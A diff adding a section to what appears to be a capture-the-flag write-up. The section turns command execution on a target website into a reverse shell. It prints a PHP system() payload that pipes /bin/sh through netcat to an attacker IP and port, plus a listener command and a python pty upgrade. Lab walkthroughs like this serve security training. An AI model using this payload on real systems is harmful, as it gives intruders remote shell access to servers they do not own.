@@ -72,3 +72,27 @@ Save and click on the binoculars icon to view our website.
 
 And here is our vulnerability, the site has issued a response to the `whoami` command. Let's try to get **reverse shell**.
 
+My site crashes VERY often, so it needs to be recreated every time...
+
+```
+<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.181 9999 >/tmp/f");?>
+```
+Instead of my ip, put yours, (you can view it using the command `ip a`, it will be in tun0).
+
+we launch **netcat** through the terminal:
+
+```
+nc -lvnp 9999
+```
+
+Now, save it again and click on the binoculars and we get access to the server!.
+
+![image](https://github.com/user-attachments/assets/791538f2-97cf-4cea-873c-d81609b06067)
+
+For convenience, we create a terminal interface.
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+
